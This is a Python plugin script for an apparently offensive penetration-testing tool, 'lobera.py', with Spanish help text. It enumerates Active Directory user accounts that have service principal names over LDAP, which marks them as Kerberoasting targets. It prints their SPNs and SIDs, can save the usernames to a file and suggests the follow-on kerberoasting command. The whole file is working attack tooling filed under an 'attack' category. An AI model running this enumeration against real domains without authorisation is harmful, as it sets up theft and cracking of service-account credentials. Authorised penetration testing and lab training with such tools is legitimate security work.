# scripts/ldap/attack/kerberoast-targets.py

from scripts.base import BaseScript
from core.output import print_result, print_table, console

try:
    from modules.ldap import LDAPModule
    _LDAP_AVAILABLE = True
except ImportError:
    _LDAP_AVAILABLE = False


class Script(BaseScript):
    name        = "kerberoast-targets"
    protocol    = "ldap"
    category    = "attack"
    description = (
        "Enumera via LDAP cuentas de usuario (no máquina) con SPN registrado: "
        "candidatos a Kerberoasting. Muestra SPN, cuenta y cuándo se usó por última vez."
    )
    requires_auth = True

    EXAMPLES = [
        {
            "flag":  "-t / -u / -p / -d",
            "desc":  "Cualquier cuenta del dominio sirve para enumerar SPNs",
            "good":  "lobera.py ldap --script=kerberoast-targets -t 10.129.1.5 -u iker -p 'Pass1' -d CORP.LOCAL",
            "bad":   "lobera.py ldap --script=kerberoast-targets -t 10.129.1.5  [sin credenciales no funciona en DCs modernos]",
        },
        {
            "flag":  "--save-list",
            "desc":  "Guarda los usuarios encontrados en fichero para pasar a kerberoasting",
            "good":  "lobera.py ldap --script=kerberoast-targets -t 10.129.1.5 -u iker -p 'Pass1' -d CORP.LOCAL --save-list kerb_users.txt",
            "bad":   "lobera.py ldap --script=kerberoast-targets -t 10.129.1.5 -u iker -p 'Pass1' -d CORP.LOCAL  [sin --save-list copiar a mano]",
        },
        {
            "flag":  "--exclude-computers",
            "desc":  "Excluye SPNs de cuentas de máquina (ya excluidos por defecto, flag explícito para claridad)",
            "good":  "lobera.py ldap --script=kerberoast-targets -t 10.129.1.5 -u iker -p 'Pass1' -d CORP.LOCAL --exclude-computers",
            "bad":   "lobera.py ldap --script=kerberoast-targets -t 10.129.1.5 -u iker -p 'Pass1' -d CORP.LOCAL  [cuentas de máquina ya se excluyen en el filtro LDAP]",
        },
    ]

    def run(self, **kwargs):
        if not _LDAP_AVAILABLE:
            print_result("LDAP", str(self.target.ip), "fail",
                         "modules/ldap.py no encontrado")
            return []

        ldap = LDAPModule(
            self.target, self.creds,
            use_ssl=kwargs.get("ldaps", False),
            port=kwargs.get("port"),
        )
        if not ldap.connect():
            return []

        try:
            spn_accounts = ldap.get_spn_accounts()

            if not spn_accounts:
                print_result("LDAP", str(self.target.ip), "info",
                             "No se encontraron cuentas de usuario con SPN")
                return []

            rows = []
            for acc in spn_accounts:
                for spn in acc["spns"]:
                    rows.append((acc["user"], spn, acc["sid"]))

            print_table(
                "Cuentas Kerberoastables ({} cuentas, {} SPNs)".format(
                    len(spn_accounts),
                    sum(len(a["spns"]) for a in spn_accounts),
                ),
                ["Usuario", "SPN", "SID"],
                rows,
            )

            print_result("LDAP", str(self.target.ip), "pwned",
                         "{} cuenta(s) Kerberoastable(s)".format(len(spn_accounts)))

            # Guardar lista de usuarios si se pidió
            save_path = kwargs.get("save_list")
            if save_path:
                try:
                    with open(save_path, "w") as f:
                        for acc in spn_accounts:
                            f.write(acc["user"] + "\n")
                    print_result("LDAP", str(self.target.ip), "ok",
                                 "Lista de usuarios guardada en {}".format(save_path))
                except OSError as exc:
                    print_result("LDAP", str(self.target.ip), "fail",
                                 "No se pudo guardar la lista: {}".format(exc))

            # Sugerir el script de kerberoasting con el primer SPN como ejemplo
            first_spn = spn_accounts[0]["spns"][0] if spn_accounts[0]["spns"] else ""
            console.print(
                "\n[dim]→ Siguiente paso:[/dim]\n"
                "  lobera.py kerberos --script=kerberoasting "
                "-t {ip} -d {domain} -u {user} -p PASSWORD --spn '{spn}'".format(
                    ip=self.target.ip,
                    domain=self.creds.domain or self.target.domain or "DOMINIO",
                    user=self.creds.user or "USUARIO",
                    spn=first_spn,
                )
            )

            return spn_accounts

        finally:
            ldap.disconnect()
